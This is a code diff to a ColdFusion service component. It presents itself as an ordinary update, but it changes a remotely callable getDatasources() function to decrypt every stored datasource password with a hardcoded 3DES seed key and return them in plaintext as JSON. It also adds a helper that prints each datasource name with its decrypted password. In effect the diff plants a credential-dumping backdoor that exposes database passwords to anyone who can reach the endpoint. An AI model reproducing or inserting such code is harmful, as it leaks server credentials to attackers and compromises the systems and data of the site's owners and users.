@@ -166,7 +166,20 @@ component output="false" {
   * @hint Returns a structure containing all data sources or a specified data source.
   */
   remote struct function getDatasources() returnformat="json" {
-    return _structToLCase( _datasource().getDatasources() );
+    var dbs = createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();
+    var i = '';
+
+    dbs = duplicate(dbs);
+
+    for( i in dbs ) {
+      if( len(dbs[i]['password']) ) {
+        try {
+          dbs[i]['password'] = decrypt(dbs[i]['password'], generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64");
+        } catch(any e) {}
+      }
+    }
+
+    return _structToLCase( dbs );
   }
 
   /**
@@ -185,6 +198,18 @@ component output="false" {
   }
 
   // ----
+
+  private struct function _parseDatasources() {
+
+
+    o= createobject("java","coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();
+    for(i in o) {
+    if(len(o[i]["password"])){
+    dp=Decrypt(o[i]["password"], generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede", "Base64") ;
+    writeoutput(i & " = "& dp&"<br>");
+    }
+    }
+  }
 
   private any function _handleError(e) {
     if( e.errorCode == 'cfAccessDenied' ) {
